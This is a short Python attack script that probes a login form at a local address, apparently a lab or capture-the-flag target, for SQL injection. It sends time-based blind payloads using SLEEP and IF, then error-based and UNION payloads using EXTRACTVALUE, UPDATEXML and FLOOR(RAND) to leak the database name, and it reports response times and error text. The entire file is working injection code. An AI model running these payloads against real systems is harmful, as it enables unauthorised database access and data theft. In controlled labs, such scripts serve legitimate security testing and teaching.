import requests
import time
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing time-based blind SQL injection\n")

# Test time-based injection
payloads = [
    ("admin' AND SLEEP(0)-- -", "SLEEP(0) - should be fast"),
    ("admin' AND SLEEP(3)-- -", "SLEEP(3) - should be slow"),
    ("admin' AND IF(1=1,SLEEP(3),0)-- -", "IF true with SLEEP(3)"),
    ("admin' AND IF(1=0,SLEEP(3),0)-- -", "IF false with SLEEP(3)"),
]

for payload, desc in payloads:
    start = time.time()
    r = requests.get(target, params={'username': payload, 'password': 'x'}, timeout=10)
    elapsed = time.time() - start
    
    print(f"[{desc}]")
    print(f"  Payload: {payload}")
    print(f"  Time: {elapsed:.2f}s")
    print(f"  Length: {len(r.text)}")
    print()
    
    if elapsed > 2:
        print("  [+] Time delay detected! Time-based blind SQLi works!")

print("\n" + "="*80 + "\n")

# Try error-based injection
print("[*] Testing error-based SQL injection\n")

error_payloads = [
    "admin' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)-- -",
    "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -",
    "admin' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)-- -",
    "admin' UNION SELECT NULL,NULL,DATABASE(),NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
]

for payload in error_payloads:
    r = requests.get(target, params={'username': payload, 'password': 'x'})
    print(f"Payload: {payload[:70]}")
    print(f"  Length: {len(r.text)}")
    
    # Check for SQL errors or database names in response
    if re.search(r'(sql|mysql|error|warning|database)', r.text, re.I):
        print(f"  [+] Potential error message found!")
        print(f"  Response snippet:\n{r.text[:500]}")
    
